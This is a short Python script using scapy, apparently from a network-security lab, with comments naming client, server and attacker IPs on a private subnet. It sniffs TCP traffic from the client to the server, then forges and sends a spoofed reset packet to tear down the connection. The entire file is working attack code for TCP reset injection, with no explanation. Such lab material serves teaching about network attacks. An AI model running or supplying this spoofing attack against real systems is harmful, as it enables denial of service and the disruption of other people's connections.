#!/usr/bin/python3
from scapy.all import *
# Client IP : 10.0.2.15
# Server IP : 10.0.2.5
# Attacker IP : 10.0.2.6
def spoof(pkt):
  old_ip = pkt[IP]
  old_tcp = pkt[TCP]
  print("IP source: ", old_ip.src)
  print("IP dest: ", old_ip.dst)
  print("Port source: ", old_tcp.sport)
  print("Port dest: ", old_tcp.dport)

  newseq = old_tcp.seq + 1
  newack = old_tcp.ack 
  ip = IP(src = old_ip.src, dst = old_ip.dst)
  tcp = TCP(sport = old_tcp.sport, dport = old_tcp.dport, flags = 'R', seq = newseq, ack = newack)

  pkt = ip/tcp
  #ls(pkt)
  send(pkt, verbose = 0)

  quit()

myFilter = 'tcp and src host 10.0.2.15 and dst host 10.0.2.5'
sniff(filter = myFilter, prn=spoof)